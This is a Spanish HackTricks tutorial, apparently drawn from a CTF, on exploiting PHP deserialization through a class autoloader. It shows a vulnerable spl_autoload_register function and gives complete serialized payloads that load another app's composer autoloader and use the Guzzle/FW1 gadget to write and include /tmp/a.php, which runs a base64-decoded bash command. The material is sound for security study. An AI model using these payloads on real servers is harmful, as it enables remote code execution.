# PHP - Deserializaci贸n + Autoload de Clases

<details>

<summary><strong>Aprende hacking en AWS de cero a h茅roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆gueme** en **Twitter**  [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

Primero, deber铆as revisar qu茅 son las [**Clases de Autocarga**](https://www.php.net/manual/en/language.oop5.autoload.php).

## Deserializaci贸n en PHP + spl\_autoload\_register + LFI/Gadget

Nos encontramos en una situaci贸n donde descubrimos una **deserializaci贸n en PHP en una webapp** sin ninguna librer铆a vulnerable a gadgets dentro de **`phpggc`**. Sin embargo, en el mismo contenedor hab铆a una **webapp de composer diferente con librer铆as vulnerables**. Por lo tanto, el objetivo era **cargar el cargador de composer de la otra webapp** y abusar de 茅l para **cargar un gadget que explotar谩 esa librer铆a con un gadget** de la webapp vulnerable a la deserializaci贸n.

Pasos:

* Has encontrado una **deserializaci贸n** y **no hay ning煤n gadget** en el c贸digo de la app actual
* Puedes abusar de una funci贸n **`spl_autoload_register`** como la siguiente para **cargar cualquier archivo local con extensi贸n `.php`**
* Para ello utilizas una deserializaci贸n donde el nombre de la clase va a estar dentro de **`$name`**. **No puedes usar "/" o "."** en un nombre de clase en un objeto serializado, pero el **c贸digo** est谩 **reemplazando** los **guiones bajos** ("\_") **por barras** ("/"). As铆 que un nombre de clase como `tmp_passwd` se transformar谩 en `/tmp/passwd.php` y el c贸digo intentar谩 cargarlo.\
Un **ejemplo de gadget** ser铆a: **`O:10:"tmp_passwd":0:{}`**
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
{% hint style="success" %}
Si tienes una **carga de archivo** y puedes subir un archivo con extensi贸n **`.php`**, podr铆as **abusar de esta funcionalidad directamente** y obtener RCE de inmediato.
{% endhint %}

En mi caso, no ten铆a algo as铆, pero hab铆a dentro del **mismo contenedor** otra p谩gina web de composer con una **librer铆a vulnerable a un gadget de `phpggc`**.

* Para cargar esta otra librer铆a, primero necesitas **cargar el cargador de composer de esa otra aplicaci贸n web** (porque el de la aplicaci贸n actual no acceder谩 a las librer铆as de la otra.) **Conociendo la ruta de la aplicaci贸n**, puedes lograr esto muy f谩cilmente con: **`O:28:"www_frontend_vendor_autoload":0:{}`** (En mi caso, el cargador de composer estaba en `/www/frontend/vendor/autoload.php`)
* Ahora, puedes **cargar el cargador de composer de la otra aplicaci贸n**, as铆 que es momento de **`generar el payload de phpgcc`** para usar. En mi caso, utilic茅 **`Guzzle/FW1`**, que me permiti贸 **escribir cualquier archivo dentro del sistema de archivos**.
* NOTA: El **gadget generado no funcionaba**, para que funcionara **modifiqu茅** ese payload **`chain.php`** de phpggc y cambi茅 **todos los atributos** de las clases **de privados a p煤blicos**. Si no, despu茅s de deserializar la cadena, los atributos de los objetos creados no ten铆an ning煤n valor.
* Ahora tenemos la manera de **cargar el cargador de composer de la otra aplicaci贸n** y tenemos un **payload de phpggc que funciona**, pero necesitamos **hacer esto en la MISMA SOLICITUD para que el cargador est茅 cargado cuando se use el gadget**. Para eso, envi茅 un array serializado con ambos objetos como:
* Puedes ver **primero el cargador siendo cargado y luego el payload**

{% code overflow="wrap" %}
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
{% endcode %}

* Ahora, podemos **crear y escribir un archivo**, sin embargo, el usuario **no pod铆a escribir en ninguna carpeta dentro del servidor web**. Entonces, como puedes ver en el payload, PHP llama a **`system`** con algo de **base64** que se crea en **`/tmp/a.php`**. Luego, podemos **reutilizar el primer tipo de payload** que usamos como LFI para cargar el cargador de composer de la otra webapp para **cargar el archivo generado `/tmp/a.php`**. Solo agr茅galo al gadget de deserializaci贸n:&#x20;

{% code overflow="wrap" %}
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{}}
```
**Resumen del payload**

* **Cargar el autoload de composer** de otra aplicaci贸n web en el mismo contenedor
* **Cargar un gadget de phpggc** para abusar de una biblioteca de la otra aplicaci贸n web (la aplicaci贸n web inicial vulnerable a la deserializaci贸n no ten铆a ning煤n gadget en sus bibliotecas)
* El gadget **crear谩 un archivo con un payload PHP** en 茅l en /tmp/a.php con comandos maliciosos (el usuario de la aplicaci贸n web no puede escribir en ninguna carpeta de ninguna aplicaci贸n web)
* La parte final de nuestro payload usar谩 **cargar el archivo php generado** que ejecutar谩 comandos

Necesit茅 **llamar a esta deserializaci贸n dos veces**. En mis pruebas, la primera vez se cre贸 el archivo `/tmp/a.php` pero no se carg贸, y la segunda vez se carg贸 correctamente.

<details>

<summary><strong>Aprende hacking en AWS de cero a h茅roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆gueme** en **Twitter**  [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
